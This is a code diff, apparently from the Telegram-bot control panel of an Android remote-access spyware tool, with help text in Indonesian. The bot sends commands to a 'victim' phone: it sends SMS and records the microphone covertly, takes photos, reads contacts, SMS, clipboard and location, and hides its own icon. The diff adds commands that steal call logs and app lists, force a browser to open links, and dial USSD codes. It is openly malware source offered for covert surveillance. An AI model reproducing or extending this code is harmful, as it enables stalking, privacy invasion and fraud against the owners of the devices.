@@ -151,8 +151,15 @@ Harus diketik dengan format:
 • <b>notify</b> : Memunculkan Push Notification di HP target (Format: <code>Judul|Isi Pesan</code>)
 • <b>sms_send</b> : Mengirim SMS dari HP target tanpa ketahuan (Format: <code>Nomor|Pesan</code>)
 • <b>play_sound</b> : Mendownload dan memutar mp3 secara tersembunyi dari URL web
-• <b>record_sound</b> : Merekam mikrofon (Format: argumen milidetik, cth <code>5000</code>)
+• <b>record_sound</b> : Merekam mikrofon (Format: argumen detik, cth <code>5</code>)
 • <b>hide_app</b> : Menyembunyikan ikon aplikasi dari Laci Utama HP Target (Stealth Mode)
+• <b>vibrate</b> : Menggetarkan HP korban (Format: angka detik, cth <code>3</code>)
+• <b>play_alarm</b> : Membunyikan sirine/nada alarm sekencang mungkin
+• <b>get_call_logs</b> : Mengambil histori panggilan keluar/masuk (Format: limit angka, cth <code>20</code>)
+• <b>get_installed_apps</b> : Mendapatkan daftar lengkap aplikasi korban yang terinstal
+• <b>open_url</b> : Memaksa korban membuka browser (Format: link tujuan, cth <code>google.com</code>)
+• <b>set_wallpaper</b> : Mengubah Wallpaper korban (Format: URL link gambar)
+• <b>dial_number</b> : Melakukan panggilan keluar/USSD paksa (Format: nomor HP target, cth <code>*123#</code>)
 `;
         ctx.reply(helpText, { parse_mode: 'HTML' });
     };
@@ -206,10 +213,12 @@ Harus diketik dengan format:
             [Markup.button.callback('📡 Ping', `runcmd:${devId}:ping`), Markup.button.callback('🎯 Lokasi', `runcmd:${devId}:location`)],
             [Markup.button.callback('🔋 Baterai', `runcmd:${devId}:get_battery`), Markup.button.callback('🔦 Torch', `runcmd:${devId}:torch`)],
             [Markup.button.callback('📞 Kontak', `runcmd:${devId}:contacts`), Markup.button.callback('📩 Inbox SMS', `runcmd:${devId}:sms_list`)],
-            [Markup.button.callback('🔊 Record Audio', `runcmd:${devId}:record_sound`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
+            [Markup.button.callback('🔊 Record Audio', `runcmd:${devId}:record_sound 5`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
             [Markup.button.callback('📷 Foto (Belakang)', `runcmd:${devId}:photo back`), Markup.button.callback('🤳 Foto (Depan)', `runcmd:${devId}:photo front`)],
             [Markup.button.callback('🌐 WiFi Scan', `runcmd:${devId}:wifi_scan`), Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)],
             [Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)],
+            [Markup.button.callback('📳 Getar 2 dkt', `runcmd:${devId}:vibrate 2`), Markup.button.callback('🚨 Alarm Panik!', `runcmd:${devId}:play_alarm`)],
+            [Markup.button.callback('☎️ Riwayat Panggilan', `runcmd:${devId}:get_call_logs 30`), Markup.button.callback('📦 Daftar App', `runcmd:${devId}:get_installed_apps`)],
             [Markup.button.callback('👻 Hide App (Stealth)', `runcmd:${devId}:hide_app`)]
         ];
 
